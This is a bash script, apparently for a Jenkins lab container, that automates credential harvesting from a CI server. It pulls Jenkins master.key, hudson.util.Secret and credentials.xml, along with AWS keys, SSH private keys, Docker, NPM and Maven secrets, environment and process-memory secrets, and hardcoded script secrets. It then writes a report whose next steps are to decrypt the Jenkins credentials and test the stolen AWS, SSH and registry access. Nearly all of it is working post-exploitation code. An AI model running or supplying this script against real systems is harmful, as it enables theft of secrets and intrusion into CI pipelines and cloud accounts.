#!/bin/bash

echo "=========================================="
echo "  CREDENTIAL HARVESTING AUTOMATION"
echo "=========================================="
echo ""

CONTAINER="${1:-jenkins-lab}"
OUTPUT_DIR="/tmp/jenkins-creds-$$"
mkdir -p "$OUTPUT_DIR"/{encrypted,plaintext,analysis}

TOTAL_CREDS=0
ENCRYPTED_CREDS=0
PLAINTEXT_CREDS=0

echo "[+] Target Container: $CONTAINER"
echo "[+] Output Directory: $OUTPUT_DIR"
echo ""

echo "[PHASE 1] Jenkins Internal Secrets"
echo "==================================="
echo ""

echo "[1.1] Extracting master.key"
if docker exec "$CONTAINER" cat /var/jenkins_home/secrets/master.key 2>/dev/null > "$OUTPUT_DIR/encrypted/master.key"; then
    echo "    ✓ master.key extracted ($(wc -c < $OUTPUT_DIR/encrypted/master.key) bytes)"
    ENCRYPTED_CREDS=$((ENCRYPTED_CREDS + 1))
else
    echo "    ✗ master.key not found"
fi

echo "[1.2] Extracting hudson.util.Secret"
MAX_WAIT=30
WAIT=0
while [[ $WAIT -lt $MAX_WAIT ]]; do
    docker exec "$CONTAINER" cat /var/jenkins_home/secrets/hudson.util.Secret 2>/dev/null > "$OUTPUT_DIR/encrypted/hudson.util.Secret"
    if [[ -s "$OUTPUT_DIR/encrypted/hudson.util.Secret" ]]; then
        echo "    ✓ hudson.util.Secret extracted ($(wc -c < $OUTPUT_DIR/encrypted/hudson.util.Secret) bytes)"
        ENCRYPTED_CREDS=$((ENCRYPTED_CREDS + 1))
        break
    fi
    sleep 2
    WAIT=$((WAIT + 2))
done

echo "[1.3] Extracting credentials.xml"
WAIT=0
while [[ $WAIT -lt $MAX_WAIT ]]; do
    docker exec "$CONTAINER" cat /var/jenkins_home/credentials.xml 2>/dev/null > "$OUTPUT_DIR/encrypted/credentials.xml"
    if [[ -s "$OUTPUT_DIR/encrypted/credentials.xml" ]]; then
        CRED_ENTRIES=$(grep -c "entry>" "$OUTPUT_DIR/encrypted/credentials.xml" 2>/dev/null || echo 0)
        echo "    ✓ credentials.xml extracted ($CRED_ENTRIES entries)"
        ENCRYPTED_CREDS=$((ENCRYPTED_CREDS + CRED_ENTRIES))
        break
    fi
    sleep 2
    WAIT=$((WAIT + 2))
done

echo "[1.4] Searching for additional XML files"
docker exec "$CONTAINER" find /var/jenkins_home -name "*.xml" -type f 2>/dev/null | while read xmlfile; do
    filename=$(basename "$xmlfile")
    docker exec "$CONTAINER" cat "$xmlfile" 2>/dev/null > "$OUTPUT_DIR/encrypted/$filename" 2>/dev/null
done
XML_COUNT=$(ls "$OUTPUT_DIR/encrypted/"*.xml 2>/dev/null | wc -l)
echo "    ✓ Additional XML files: $XML_COUNT"

echo ""
echo "[PHASE 2] File-Based Credentials"
echo "================================="
echo ""

echo "[2.1] AWS Credentials"
docker exec "$CONTAINER" cat /home/jenkins/.aws/credentials 2>/dev/null > "$OUTPUT_DIR/plaintext/aws-credentials"
if grep -q "aws_access_key_id" "$OUTPUT_DIR/plaintext/aws-credentials" 2>/dev/null; then
    AWS_KEYS=$(grep -c "aws_access_key_id" "$OUTPUT_DIR/plaintext/aws-credentials")
    echo "    ✓ AWS credentials found: $AWS_KEYS accounts"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + AWS_KEYS))
    
    grep "aws_access_key_id" "$OUTPUT_DIR/plaintext/aws-credentials" | while read line; do
        echo "      → $(echo $line | cut -d= -f2 | tr -d ' ')"
    done
else
    echo "    ✗ AWS credentials not found"
fi

echo "[2.2] SSH Private Keys"
docker exec "$CONTAINER" cat /home/jenkins/.ssh/id_rsa 2>/dev/null > "$OUTPUT_DIR/plaintext/id_rsa"
if grep -q "BEGIN RSA PRIVATE KEY" "$OUTPUT_DIR/plaintext/id_rsa" 2>/dev/null; then
    echo "    ✓ SSH private key found"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + 1))
    chmod 600 "$OUTPUT_DIR/plaintext/id_rsa"
else
    echo "    ✗ SSH private key not found"
fi

docker exec "$CONTAINER" cat /home/jenkins/.ssh/id_ed25519 2>/dev/null > "$OUTPUT_DIR/plaintext/id_ed25519"
[[ -s "$OUTPUT_DIR/plaintext/id_ed25519" ]] && echo "    ✓ ED25519 key found" && PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + 1))

echo "[2.3] Docker Registry Credentials"
docker exec "$CONTAINER" cat /home/jenkins/.docker/config.json 2>/dev/null > "$OUTPUT_DIR/plaintext/docker-config.json"
if [[ -s "$OUTPUT_DIR/plaintext/docker-config.json" ]]; then
    DOCKER_AUTHS=$(grep -c "auth" "$OUTPUT_DIR/plaintext/docker-config.json" 2>/dev/null || echo 0)
    echo "    ✓ Docker config found ($DOCKER_AUTHS registries)"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + DOCKER_AUTHS))
else
    echo "    ✗ Docker config not found"
fi

echo "[2.4] NPM Tokens"
docker exec "$CONTAINER" cat /home/jenkins/.npmrc 2>/dev/null > "$OUTPUT_DIR/plaintext/npmrc"
if grep -q "authToken" "$OUTPUT_DIR/plaintext/npmrc" 2>/dev/null; then
    echo "    ✓ NPM token found"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + 1))
else
    echo "    ✗ NPM token not found"
fi

echo "[2.5] Maven Settings"
docker exec "$CONTAINER" cat /home/jenkins/.m2/settings.xml 2>/dev/null > "$OUTPUT_DIR/plaintext/maven-settings.xml"
if grep -q "password" "$OUTPUT_DIR/plaintext/maven-settings.xml" 2>/dev/null; then
    MAVEN_CREDS=$(grep -c "password" "$OUTPUT_DIR/plaintext/maven-settings.xml")
    echo "    ✓ Maven credentials found: $MAVEN_CREDS"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + MAVEN_CREDS))
else
    echo "    ✗ Maven credentials not found"
fi

echo ""
echo "[PHASE 3] Environment Variables"
echo "================================"
echo ""

echo "[3.1] Extracting environment secrets"
docker exec "$CONTAINER" printenv 2>/dev/null > "$OUTPUT_DIR/plaintext/environment.txt"
ENV_TOTAL=$(wc -l < "$OUTPUT_DIR/plaintext/environment.txt")
echo "    ✓ Environment variables: $ENV_TOTAL total"

echo "[3.2] Filtering sensitive variables"
grep -iE "(key|token|pass|secret|credential|api)" "$OUTPUT_DIR/plaintext/environment.txt" > "$OUTPUT_DIR/analysis/env-secrets.txt"
ENV_SECRETS=$(wc -l < "$OUTPUT_DIR/analysis/env-secrets.txt")
echo "    ✓ Sensitive variables: $ENV_SECRETS found"
PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + ENV_SECRETS))

cat "$OUTPUT_DIR/analysis/env-secrets.txt" | while read line; do
    echo "      → $line"
done

echo ""
echo "[PHASE 4] Configuration Files"
echo "=============================="
echo ""

echo "[4.1] Database credentials"
docker exec "$CONTAINER" cat /home/jenkins/.config/database.env 2>/dev/null > "$OUTPUT_DIR/plaintext/database.env"
if [[ -s "$OUTPUT_DIR/plaintext/database.env" ]]; then
    DB_CREDS=$(grep -c "=" "$OUTPUT_DIR/plaintext/database.env")
    echo "    ✓ Database config found: $DB_CREDS entries"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + DB_CREDS))
fi

echo "[4.2] API keys"
docker exec "$CONTAINER" cat /home/jenkins/.config/api_keys.env 2>/dev/null > "$OUTPUT_DIR/plaintext/api_keys.env"
if [[ -s "$OUTPUT_DIR/plaintext/api_keys.env" ]]; then
    API_KEYS=$(grep -c "=" "$OUTPUT_DIR/plaintext/api_keys.env")
    echo "    ✓ API keys found: $API_KEYS"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + API_KEYS))
fi

echo "[4.3] Cloud credentials"
docker exec "$CONTAINER" cat /home/jenkins/.config/cloud.env 2>/dev/null > "$OUTPUT_DIR/plaintext/cloud.env"
if [[ -s "$OUTPUT_DIR/plaintext/cloud.env" ]]; then
    CLOUD_CREDS=$(grep -c "=" "$OUTPUT_DIR/plaintext/cloud.env")
    echo "    ✓ Cloud credentials found: $CLOUD_CREDS"
    PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + CLOUD_CREDS))
fi

echo ""
echo "[PHASE 5] Script Analysis"
echo "========================="
echo ""

echo "[5.1] Searching for hardcoded secrets in scripts"
docker exec "$CONTAINER" find /tmp /opt /var -name "*.sh" -type f 2>/dev/null | while read script; do
    docker exec "$CONTAINER" cat "$script" 2>/dev/null | grep -iE "(password|key|token|secret)" > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        filename=$(basename "$script")
        echo "    ✓ Secrets in: $script"
        docker exec "$CONTAINER" cat "$script" 2>/dev/null > "$OUTPUT_DIR/analysis/$filename"
        PLAINTEXT_CREDS=$((PLAINTEXT_CREDS + 1))
    fi
done

echo "[5.2] Checking cron jobs"
docker exec "$CONTAINER" cat /etc/cron.d/jenkins-backup 2>/dev/null > "$OUTPUT_DIR/analysis/cron-jenkins-backup"
[[ -s "$OUTPUT_DIR/analysis/cron-jenkins-backup" ]] && echo "    ✓ Cron job found"

echo ""
echo "[PHASE 6] Memory Analysis"
echo "========================="
echo ""

echo "[6.1] Process environment dump"
docker exec "$CONTAINER" find /proc -maxdepth 2 -name environ 2>/dev/null | while read envfile; do
    PID=$(echo $envfile | cut -d/ -f3)
    docker exec "$CONTAINER" cat "$envfile" 2>/dev/null | tr '\0' '\n' | grep -iE "(pass|key|token|secret)" > "$OUTPUT_DIR/analysis/proc-$PID-secrets.txt" 2>/dev/null
    if [[ -s "$OUTPUT_DIR/analysis/proc-$PID-secrets.txt" ]]; then
        echo "    ✓ Secrets in PID $PID"
    fi
done

echo ""
echo "[PHASE 7] Analysis & Reporting"
echo "==============================="
echo ""

echo "[7.1] Categorizing credentials by type"
cat > "$OUTPUT_DIR/CREDENTIAL_SUMMARY.txt" << EOF
========================================
  CREDENTIAL HARVESTING REPORT
========================================

Timestamp: $(date)
Container: $CONTAINER

SUMMARY
=======
Total Credentials: $((ENCRYPTED_CREDS + PLAINTEXT_CREDS))
Encrypted: $ENCRYPTED_CREDS
Plaintext: $PLAINTEXT_CREDS

ENCRYPTED CREDENTIALS
=====================
$(ls -lh "$OUTPUT_DIR/encrypted/" 2>/dev/null | tail -n +2)

PLAINTEXT CREDENTIALS
=====================
$(ls -lh "$OUTPUT_DIR/plaintext/" 2>/dev/null | tail -n +2)

CREDENTIAL TYPES FOUND
======================
- Jenkins Master Key: $(test -f "$OUTPUT_DIR/encrypted/master.key" && echo "✓" || echo "✗")
- Hudson Util Secret: $(test -f "$OUTPUT_DIR/encrypted/hudson.util.Secret" && echo "✓" || echo "✗")
- Credentials XML: $(test -f "$OUTPUT_DIR/encrypted/credentials.xml" && echo "✓" || echo "✗")
- AWS Credentials: $(test -f "$OUTPUT_DIR/plaintext/aws-credentials" && echo "✓" || echo "✗")
- SSH Private Key: $(test -f "$OUTPUT_DIR/plaintext/id_rsa" && echo "✓" || echo "✗")
- Docker Registry: $(test -f "$OUTPUT_DIR/plaintext/docker-config.json" && echo "✓" || echo "✗")
- NPM Token: $(test -f "$OUTPUT_DIR/plaintext/npmrc" && echo "✓" || echo "✗")
- Maven Settings: $(test -f "$OUTPUT_DIR/plaintext/maven-settings.xml" && echo "✓" || echo "✗")
- Database Config: $(test -f "$OUTPUT_DIR/plaintext/database.env" && echo "✓" || echo "✗")
- API Keys: $(test -f "$OUTPUT_DIR/plaintext/api_keys.env" && echo "✓" || echo "✗")
- Cloud Credentials: $(test -f "$OUTPUT_DIR/plaintext/cloud.env" && echo "✓" || echo "✗")

NEXT STEPS
==========
1. Decrypt Jenkins credentials:
   cd ../../offsec-jenkins
   python3 decrypt.py \\
     --key $OUTPUT_DIR/encrypted/master.key \\
     --secret $OUTPUT_DIR/encrypted/hudson.util.Secret \\
     --xml $OUTPUT_DIR/encrypted/credentials.xml \\
     --export-json $OUTPUT_DIR/decrypted-credentials.json

2. Test AWS credentials:
   aws configure set aws_access_key_id <KEY>
   aws s3 ls

3. Test SSH key:
   ssh -i $OUTPUT_DIR/plaintext/id_rsa user@target

4. Test Docker registry:
   docker login <registry>

========================================
EOF

echo "    ✓ Summary report generated"

echo "[7.2] Creating quick reference"
cat > "$OUTPUT_DIR/QUICK_REFERENCE.txt" << EOF
Quick Credential Reference
==========================

AWS Credentials:
$(grep "aws_access_key_id" "$OUTPUT_DIR/plaintext/aws-credentials" 2>/dev/null || echo "Not found")

SSH Key Location:
$OUTPUT_DIR/plaintext/id_rsa

Environment Secrets:
$(head -10 "$OUTPUT_DIR/analysis/env-secrets.txt" 2>/dev/null || echo "Not found")

For full details see:
$OUTPUT_DIR/CREDENTIAL_SUMMARY.txt
EOF

echo "    ✓ Quick reference generated"

echo ""
echo "=========================================="
echo "         HARVESTING SUMMARY"
echo "=========================================="
echo ""
echo "🔑 Total Credentials: $((ENCRYPTED_CREDS + PLAINTEXT_CREDS))"
echo "🔒 Encrypted: $ENCRYPTED_CREDS"
echo "📝 Plaintext: $PLAINTEXT_CREDS"
echo ""
echo "📁 Output Directory: $OUTPUT_DIR"
echo ""
echo "Key Reports:"
echo "  - CREDENTIAL_SUMMARY.txt"
echo "  - QUICK_REFERENCE.txt"
echo ""
echo "Decrypt credentials:"
echo "  cd ../../offsec-jenkins"
echo "  python3 decrypt.py --key $OUTPUT_DIR/encrypted/master.key \\"
echo "    --secret $OUTPUT_DIR/encrypted/hudson.util.Secret \\"
echo "    --xml $OUTPUT_DIR/encrypted/credentials.xml"
echo ""

TOTAL_CREDS=$((ENCRYPTED_CREDS + PLAINTEXT_CREDS))
exit 0
